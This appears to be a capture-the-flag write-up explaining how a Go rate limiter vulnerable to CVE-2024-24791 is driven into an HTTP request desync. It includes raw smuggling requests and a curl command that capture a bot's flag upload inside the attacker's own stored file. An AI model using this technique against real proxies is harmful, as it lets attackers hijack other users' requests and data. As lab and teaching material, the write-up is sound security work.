# g0g0g0 (by @Alemmi and @7h:0m:4s)

## Challenge 
The challenge consists of a:
- a PHP server with a simple file storage solution
- A ratelimiter written in Go
- A bot that periodically uploads the flag

## The bug

The rate limiter (thanks to ChatGPT) uses a Go version vulnerable to `CVE-2024-24791`.

In this version, the net/http client mishandled the case where a server responds to a request with an "Expect: 100-continue" header with a non-informational (200 or higher) status. This mishandling could leave a client connection in an invalid state.

## From a DoS bug to a desync game

### Idea

To steal the bot request, we need to trick the backend/frontend connection in this way.

- The backend has to expect a body
- The frontend has to expect a new request

With this situation, the bot request passes through the proxy as a new request, but the backend server uses it as the body of the attacker's request.

### Trigger desync

To trigger the desync, we need to send an `Expect: 100-Continue` request to an endpoint that returns a non-informational status. For example, we can send a `POST` to the default file `/index.nginx-debian.html` and NGINX will answer `405`

```http
POST /index.nginx-debian.html HTTP/1.1
Host: images.example.com
Connection: close
Content-Type: image/png
Content-Length: 195
Expect: 100-continue

```

### Smuggling connection

So now we can trick the connection by sending a POST whose body consists of two other requests:

- A GET to make the connection keep-alived
- And a POST with a bigger content length. This will be the prefix to the bot request, so this request needs to be a valid post request

```http
POST /index.php HTTP/1.1
Host: localhost:9998
User-Agent: curl/8.11.1
Content-Length: 254
Connection: close
Accept: */*
Cookie: PHPSESSID=111111
Accept-Encoding: gzip
X-Forwarded-For: 172.20.0.1

GET /pwned HTTP/1.1
Host: localhost:9998
Connection: keep-alive
User-Agent: curl/8.11.1

POST /index.php?filename=flag HTTP/1.1
Host: localhost:9998
Connection: keep-alive
User-Agent: curl/8.11.4
Content-Length: 470
Accept: */*
Cookie: PHPSESSID=111111

```

### Get the flag

Now we have to wait ~30s for the bot request, and then we can take the flag with a simple curl.

```bash
curl -H 'Cookie: PHPSESSID=111111' 'http://<ip>/?filename=flag'
```

